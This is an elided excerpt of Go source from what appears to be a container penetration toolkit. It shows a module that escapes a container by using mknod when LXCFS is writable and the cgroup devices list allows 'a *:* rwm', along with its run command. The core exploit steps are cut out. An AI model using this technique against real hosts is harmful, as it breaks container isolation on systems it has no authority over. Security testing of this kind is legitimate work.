...
func findDevicesAllowPath(mi *util.MountInfo) bool {
	if mi.MountPoint == util.CgroupDevices() {
		log.Printf("found pod devices control path\n")
		return true
	}
	return false
}
...
func ExploitLXCFS() bool {
	...
	// ./cdk run lxcfs-mknod-boundary "filter-string"
	...
	if strings.Contains(devicesAllow, "a *:* rwm") {
		...
		resultName := "./.lxcfs_db_" + util.RandString(6)
...
func (l lxcfsRWS) Desc() string {
	return "escape container by syscall mknod when root has LXCFS read & write privilege,  usage: `./cdk run lxcfs-mknod-boundary`"
}
